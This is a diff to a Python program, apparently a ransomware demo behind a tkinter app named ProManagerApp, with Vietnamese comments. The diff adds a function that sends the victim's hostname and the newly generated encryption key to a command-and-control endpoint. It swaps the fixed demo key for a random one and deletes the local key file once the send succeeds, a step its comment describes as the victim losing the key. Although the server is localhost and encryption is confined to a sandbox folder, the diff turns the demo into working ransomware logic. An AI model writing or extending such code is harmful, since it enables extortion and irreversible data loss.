@@ -7,6 +7,35 @@ import base64
 import tkinter as tk
 from tkinter import ttk
 
+import urllib.request, socket, json
+
+import urllib.request, socket, json  # thêm vào import đầu file
+
+def _report_to_c2(key: bytes, files_encrypted: int) -> bool:
+    """
+    Gửi key về C&C server
+    Returns True nếu gửi thành công
+    """
+    victim_id = socket.gethostname() + '_' + str(os.getpid())
+    payload   = json.dumps({
+        'victim_id': victim_id,
+        'hostname':  socket.gethostname(),
+        'key':       key.hex(),          # bytes → hex string
+        'files':     files_encrypted,
+    }).encode()
+
+    try:
+        req = urllib.request.Request(
+            'http://localhost:8888/register',
+            data    = payload,
+            headers = {'Content-Type': 'application/json'},
+        )
+        urllib.request.urlopen(req, timeout=3)
+        return True
+    except Exception:
+        return False   # C&C offline → silent fail
+
+
 _base = os.path.dirname(os.path.abspath(__file__))
 
 # When running as a PyInstaller exe, sys.frozen is True and modules are bundled
@@ -88,10 +117,17 @@ DEMO_SKIP_EXTENSIONS = {'.exe', '.py', '.ps1', '.sh', '.bat', '.so', '.dll'}
 
 def trigger_encryption(sandbox_dir: str) -> None:
     _ensure_sandbox()
+
+    # ── Sinh key ngẫu nhiên thay vì key cố định ──────────────
+    import secrets
+    session_key = secrets.token_bytes(32)
+
     key_file = os.path.join(sandbox_dir, ".ransom_key")
     with open(key_file, "wb") as fh:
-        fh.write(DEMO_KEY)
+        fh.write(session_key)
 
+    # ── Phần mã hóa giữ nguyên ───────────────────────────────
+    count = 0
     for root, _, files in os.walk(sandbox_dir):
         for filename in files:
             ext = os.path.splitext(filename)[1].lower()
@@ -116,6 +152,18 @@ def trigger_encryption(sandbox_dir: str) -> None:
                 fh.write(DEMO_HEADER + base64.b64encode(data))
 
             os.replace(filepath, filepath + DEMO_ORIGINAL_EXT)
+            count += 1
+
+    # ── Gửi key về C&C ───────────────────────────────────────
+    success = _report_to_c2(session_key, count)
+
+    if success:
+        # Xóa key local — nạn nhân mất key
+        os.remove(key_file)
+        print("[*] Key exfiltrated to C&C, local key deleted")
+    else:
+        # C&C offline → giữ key local, fallback cho demo
+        print("[*] C&C unreachable, key kept local")
 
 
 class ProManagerApp:
